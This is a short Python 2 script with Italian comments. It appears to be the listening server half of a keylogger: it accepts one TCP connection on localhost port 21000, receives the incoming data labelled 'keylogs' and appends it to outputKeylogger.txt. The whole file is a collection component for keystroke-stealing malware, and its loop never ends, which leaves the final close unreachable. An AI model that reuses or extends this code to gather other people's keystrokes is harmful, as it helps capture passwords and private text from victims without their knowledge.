import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1',21000))
sock.listen(1)
conn,addr = sock.accept()

print"Server in ascolto...."

while 1:
    keylogs = conn.recv(1024)

    #Scrivo il carattere ricevuto nel file
    f = open('outputKeylogger.txt','a+')
    f.write(keylogs)
    f.close()

sock.close()
